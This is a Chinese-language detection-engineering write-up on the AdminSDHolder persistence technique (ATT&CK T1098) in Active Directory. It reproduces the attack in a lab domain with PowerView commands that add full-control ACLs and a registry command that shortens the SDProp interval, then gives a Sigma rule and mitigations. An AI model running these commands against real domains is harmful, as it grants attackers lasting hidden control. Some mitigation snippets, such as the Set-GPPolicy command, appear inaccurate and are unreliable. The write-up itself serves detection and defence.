# T1098-Win-AdminSDHolder

## 描述

攻击者通过账户操作技术维持对目标环境的凭据或特定权限级别的持久化访问（T1098）。AdminSDHolder是Active Directory（AD）中的一个特殊容器（`CN=AdminSDHolder,CN=System,DC=<domain>`），其访问控制列表（ACL）作为受保护账户和组（如Domain Admins、Enterprise Admins）的权限模板。AD的SDProp（Security Descriptor Propagator）进程每60分钟（默认）将AdminSDHolder的ACL同步到受保护对象，确保其权限一致性，防止意外修改。

攻击者可通过修改AdminSDHolder的ACL，间接赋予特定用户对所有受保护账户和组的权限（如完全控制），实现域环境的持久化控制。此技术需域管理员权限，且修改会在下次SDProp运行时生效（默认60分钟）。由于AdminSDHolder的ACL更改较为罕见，检测其异常修改是关键。

## 测试案例

AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板。

Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的。

如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法。

## 检测日志

Windows 安全日志

## 测试复现

### 完整利用过程

1.枚举受保护的AD账户和组中的信息

查找有价值的用户，需要确认该用户是否属于受保护的AD账户和组，排除曾经属于受保护的AD账户和组。

2.向AdminSDHolder对象添加ACL

例如添加用户testa对AdminSDHolder的完全访问权限。

默认等待60分钟以后，testa获得对所有受保护的AD账户和组的完全访问权限。

可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：

```reg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD
```

例如修改成等待600秒的命令如下：

```reg
reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters/v AdminSDProtectFrequency /t REG_DWORD/d 600
```

参考资料：<https://blogs.technet.microsoft.com/askds/2009/05/07/five-common-questions-about-adminsdholder-and-sdprop/>

**注：不建议降低默认间隔时间，因为在大型环境中可能会导致LSASS性能下降。**

3.获得对整个域的控制权限

(1)用户testa能够向域管理员组添加帐户。

验证权限的命令如下：

```powershell
Import-Module .\PowerView.ps1
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'}
```

(2)用户testa能够直接访问域控制器上的文件。

### 测试过程

1.查询AdminSDHolder对象的ACL
查询AdminSDHolder对象的ACL等价于查询"CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org"的ACL。

命令如下：

```powershell
Import-Module .\PowerView.ps1
Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System"|select IdentityReference
```

**真实测试情况**

```powershell
PS C:\Users\Administrator\Desktop\mimikatz_trunk> Import-Module .\PowerView.ps1
PS C:\Users\Administrator\Desktop\mimikatz_trunk> Get-ObjectAcl -ADSprefix "CN=AdminSDHolder,CN=System"|select IdentityR
eference

IdentityReference
-----------------
NT AUTHORITY\Authenticated Users
NT AUTHORITY\SYSTEM
BUILTIN\Administrators
XIAOMI\Domain Admins
XIAOMI\Enterprise Admins
Everyone
NT AUTHORITY\SELF
NT AUTHORITY\SELF
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Pre-Windows 2000 Compatible Access
BUILTIN\Windows Authorization Access Group
BUILTIN\Terminal Server License Servers
BUILTIN\Terminal Server License Servers
XIAOMI\Cert Publishers
```

2.向AdminSDHolder对象添加ACL

添加用户，xiaomi的完全访问权限，命令如下：

```powershell
Import-Module .\PowerView.ps1
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName xiaomi -Verbose -Rights All
```

注意:本文提到的百度社区参考链接此处存在问题。是Rights不是文中提到的Right

**真实测试情况**

```powershell
PS C:\Users\Administrator\Desktop\mimikatz_trunk> Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -Principal
SamAccountName xiaomi -Verbose -Rights All
详细信息: Get-DomainSearcher search string: LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org
详细信息: Get-DomainSearcher search string: LDAP://DC=xiaomi,DC=org
详细信息: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 'All' on
CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org
详细信息: Granting principal S-1-5-21-3576461989-1381017913-248049510-1104 '00000000-0000-0000-0000-000000000000'
rights on CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org
```

3.验证用户权限

等待六十分钟后，执行以下命令查询用户xiaomi的权限：

```powershell
Import-Module .\PowerView.ps1
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference-match'xiaomi'}
OR
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | select IdentityReference
```

4.删除AdminSDHolder中指定用户的ACL

搜索条件为"LDAP://CN=AdminSDHolder,CN=System,DC=test,DC=com"

删除用户xiaomi的完全访问权限，命令如下（**测试执行失败**，具体原因未查）：

```powershell
Remove-DomainObjectAcl -TargetSearchBase "LDAP://CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org" -PrincipalIdentity xiaomi -Rights All -Verbose
```

## 测试留痕

windows安全日志

## 检测规则/思路

### Sigma规则

```yml
title: Windows-AdminSDHolder
description: Windows server 2008 R2（AD域控）
references: 
    - https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md
    - https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/persistence/AdminSDHolder.py
tags: 1098
author: 12306Bro
logsource:
    product: windows
    service: security
detection:
    selection1:
        EventID: 5136  #已修改目录服务对象。AdminSDHolder更改，一般用作权限维持，因为更改情况极少
    selection2:
        EventID: 4780  #ACL设置在管理员组成员的帐户上
    timeframe: last 1h #默认等待60分钟之后生效，具体原因可参考下面SDPROP说明
    condition: all of them
level: medium
```


## 建议

### 缓解措施

防御AdminSDHolder滥用需从权限控制、配置加固和监控入手：

1. **限制AdminSDHolder访问**  
   - 确保仅Domain Admins和Enterprise Admins能修改AdminSDHolder ACL。  
   - 使用AD权限审计工具（如ADAudit）检查ACL配置。

2. **最小化管理员权限**  
   - 遵循最小权限原则，限制域管理员账户的使用。  
   - 配置组策略限制非必要用户的DC访问：
     ```powershell
     Set-GPPolicy -Name "Deny DC Access" -Path "Computer Configuration\Policies\Windows Settings\Deny log on locally"
     ```

3. **凭据保护**  
   - 启用多因素认证（MFA）保护域管理员账户。  
   - 使用受限管理员模式减少凭据暴露。

4. **日志和监控**  
   - 启用事件ID 5136和4780的监控，检测AdminSDHolder ACL修改。  
   - 配置Sysmon监控`powershell.exe`及注册表更改。  
   - 使用EDR工具检测PowerView或其他AD攻击工具。

5. **定期审计**  
   - 检查AdminSDHolder ACL及受保护对象的权限。  
   - 示例PowerShell命令：
     ```powershell
     Get-Acl -Path "AD:\CN=AdminSDHolder,CN=System,DC=xiaomi,DC=org" | Format-List
     ```

## 参考推荐

- MITRE ATT&CK: T1098  
  <https://attack.mitre.org/techniques/T1098/>  
- 域渗透——AdminSDHolder  
  <https://anquan.baidu.com/article/877>  
- PowerView  
  <https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1>  
- SDPROP说明  
  <https://xz.aliyun.com/t/7276>  
- AD Attack Defense  
  <https://github.com/infosecn1nja/AD-Attack-Defense>  
- WatchAD AdminSDHolder Detection  
  <https://github.com/0Kee-Team/WatchAD/blob/master/modules/detect/event_log/persistence/AdminSDHolder.py>
